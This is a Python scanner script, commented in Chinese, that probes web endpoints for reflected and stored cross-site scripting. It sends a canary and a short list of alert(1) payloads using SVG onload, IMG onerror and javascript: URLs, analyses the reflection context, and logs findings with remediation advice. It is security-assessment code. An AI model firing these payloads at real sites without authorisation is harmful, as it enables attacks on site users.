#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""xss_probe.py —— 反射型 / 基础存储型 XSS 取证。

不是“打一堆 payload 看弹窗”，而是：
1. 先发唯一 canary，确认反射点；
2. 再发带 HTML/属性闭合的 payload，判断危险字符是否被原样输出；
3. 记录上下文片段与原始响应，给报告用。

DOM XSS 需要浏览器执行 JS，见 references/xss-playbook.md 的手工/浏览器流程。
"""
import argparse
import json
import os
import random
import re
import sys
import urllib.parse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import httpkit
from findings import FindingStore


def apply_url(template, value):
    if "*" not in template:
        raise ValueError("target 必须含 * 标记")
    parts = urllib.parse.urlsplit(template)
    pairs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    out = []
    for k, v in pairs:
        if "*" in k:
            k = k.replace("*", value, 1)
        if "*" in v:
            v = v.replace("*", value, 1)
        out.append((k, v))
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path,
                                    urllib.parse.urlencode(out, quote_via=urllib.parse.quote),
                                    parts.fragment))


def apply_body(template, value):
    pairs = urllib.parse.parse_qsl(template, keep_blank_values=True)
    out = []
    for k, v in pairs:
        if "*" in k:
            k = k.replace("*", value, 1)
        if "*" in v:
            v = v.replace("*", value, 1)
        out.append((k, v))
    return urllib.parse.urlencode(out, quote_via=urllib.parse.quote)


def is_dangerous_reflection(text, payload):
    """判断反射是否真的可执行：<title>/<textarea>/<script> 文本、普通属性值不算。"""
    i = text.find(payload)
    if i < 0:
        return False, "not-reflected"
    before = text[:i]
    lt, gt = before.rfind("<"), before.rfind(">")
    inside_tag = lt > gt
    if not inside_tag:
        low = before.lower()
        if low.rfind("<title") > low.rfind("</title"):
            return False, "title-text"
        if low.rfind("<textarea") > low.rfind("</textarea"):
            return False, "textarea-text"
        probe = payload.lstrip("'\">")
        if probe.lower().startswith(("<svg", "<img", "<script", "<iframe", "<body", "<details", "<meta")):
            return True, "html-body"
        return False, "text"
    tag_end = text.find(">", lt)
    tag = text[lt:tag_end + 1] if tag_end >= 0 else text[lt:lt + 300]
    m = re.match(r"<\s*([a-zA-Z0-9]+)", tag)
    name = m.group(1).lower() if m else ""
    if name in ("title", "textarea", "script", "style", "xmp", "noscript"):
        return False, name + "-text"
    attr = text[lt:i]
    am = re.search(r"([a-zA-Z_:][-a-zA-Z0-9_:.]*)\s*=\s*[\"']?[^\"']*$", attr)
    aname = (am.group(1).lower() if am else "")
    if aname.startswith("on"):
        return True, "event-handler"
    if aname in ("href", "src", "action", "formaction") and payload.lower().startswith("javascript:"):
        return True, "js-url"
    # 以引号开头且该引号出现在当前标签里 → 跳出属性
    if payload[:1] in ("'", '"') and payload[0] in tag:
        return True, "attr-breakout"
    return False, "attr-value"


def find_context(text, needle, width=120):
    i = text.find(needle)
    if i < 0:
        return ""
    return text[max(0, i - width):i + len(needle) + width]


def looks_encoded(text, payload):
    if payload not in text:
        return True
    # 常见编码/转义
    if "&lt;" in text and "&gt;" in text and "<" not in payload:
        return True
    return False


PAYLOADS = [
    ('"><svg/onload=alert(1)>', "HTML 属性闭合 + SVG onload"),
    ("'><svg/onload=alert(1)>", "单引号属性闭合 + SVG onload"),
    ('"><img src=x onerror=alert(1)>', "IMG onerror"),
    ("javascript:alert(1)", "javascript: 伪协议"),
]


def probe_target(client, template, store, method="GET", data=None, tag_prefix="xss"):
    canary = "wpxss" + str(random.randint(100000, 999999))
    url = apply_url(template, canary) if "*" in template else template
    body = apply_body(data, canary) if data and "*" in data else data
    r = client.request(method, url, data=body, tag=tag_prefix + "-canary")
    if canary not in (r["text"] or ""):
        return None
    base_evidence = {"status": r["status"], "url": r["url"],
                     "canary": canary, "context": find_context(r["text"], canary),
                     "artifact": r.get("evidence")}
    for payload, label in PAYLOADS:
        p_url = apply_url(template, payload) if "*" in template else template
        p_body = apply_body(data, payload) if data and "*" in data else data
        pr = client.request(method, p_url, data=p_body,
                            tag=tag_prefix + "-payload-" + label[:8].replace(" ", "_"))
        text = pr["text"] or ""
        dangerous, why = is_dangerous_reflection(text, payload)
        if payload in text and not looks_encoded(text, payload) and dangerous:
            sev = "high" if payload.startswith(('"', "'", "<")) else "medium"
            return store.add(
                module="xss",
                title="反射型 XSS（%s）" % label,
                severity=sev,
                endpoint=template,
                method=method,
                parameter="*",
                confidence="confirmed",
                cvss=6.1 if sev == "high" else 4.7,
                evidence={**base_evidence, "payload": payload, "payload_status": pr["status"],
                          "payload_context": find_context(text, payload),
                          "context_kind": why,
                          "payload_artifact": pr.get("evidence")},
                impact="攻击者可构造链接在受害者浏览器执行脚本，窃取会话/篡改页面/发起 CSRF。",
                remediation="输出编码（HTML/属性/JS/URL 分上下文）；CSP 作为纵深防御。",
                references=["WSTG-INPV-01", "WSTG-INPV-02", "OWASP XSS Prevention Cheat Sheet"],
                tags=["reflected"],
            )
    return None


def probe_stored(client, form_url, data, view_url, store):
    canary = "wpxss" + str(random.randint(100000, 999999))
    payload = '"><svg/onload=alert(1)>'
    for value in (canary, payload):
        r = client.request("POST", form_url, data=apply_body(data, value), tag="xss-stored-submit")
        if r["status"] >= 500:
            return None
    vr = client.get(view_url.replace("*", canary) if "*" in view_url else view_url,
                    tag="xss-stored-view")
    text = vr["text"] or ""
    if payload in text and not looks_encoded(text, payload):
        return store.add(
            module="xss", title="存储型 XSS（表单提交后回显）", severity="high",
            endpoint=form_url, method="POST", parameter="*", cvss=7.1,
            evidence={"payload": payload, "view_url": vr["url"],
                      "context": find_context(text, payload), "artifact": vr.get("evidence")},
            impact="payload 被持久化并在页面回显，任何访问者都会触发。",
            remediation="入库前不信任输入，输出时按上下文编码；富文本使用白名单清洗。",
            references=["WSTG-INPV-02"],
            tags=["stored"],
        )
    return None


def run(ctx):
    store = ctx["store"]
    targets = ctx.get("options", {}).get("xss_targets") or ctx.get("targets") or []
    for i, t in enumerate(targets):
        if isinstance(t, dict):
            probe_target(ctx["clients"].get(t.get("role", "anon"), ctx["anon"]),
                         t["url"], store, t.get("method", "GET"), t.get("data"),
                         "xss-%d" % (i + 1))
        else:
            probe_target(ctx["anon"], t, store, tag_prefix="xss-%d" % (i + 1))
    return store.items


def main():
    p = argparse.ArgumentParser(description="Reflected/basic stored XSS probe")
    p.add_argument("--target", action="append", default=[], help="含 * 的 URL，可重复")
    p.add_argument("--cookie-jar", default=None)
    p.add_argument("--cookie", default=None)
    p.add_argument("--rps", type=float, default=1.0)
    p.add_argument("--timeout", type=float, default=30)
    p.add_argument("--stored-form", default=None)
    p.add_argument("--stored-data", default=None)
    p.add_argument("--stored-view", default=None)
    p.add_argument("--out", default="xss-findings.json")
    p.add_argument("--evidence-dir", default="xss-raw")
    args = p.parse_args()
    client = httpkit.HttpClient(base_url="", cookie=args.cookie, cookie_jar=args.cookie_jar,
                                rps=args.rps, timeout=args.timeout,
                                evidence_dir=args.evidence_dir)
    store = FindingStore(args.out)
    for i, t in enumerate(args.target):
        probe_target(client, t, store, tag_prefix="xss-%d" % (i + 1))
    if args.stored_form and args.stored_data and args.stored_view:
        probe_stored(client, args.stored_form, args.stored_data, args.stored_view, store)
    store.save()
    print(json.dumps(store.summary(), ensure_ascii=False))
    print("findings:", os.path.abspath(args.out))


if __name__ == "__main__":
    main()
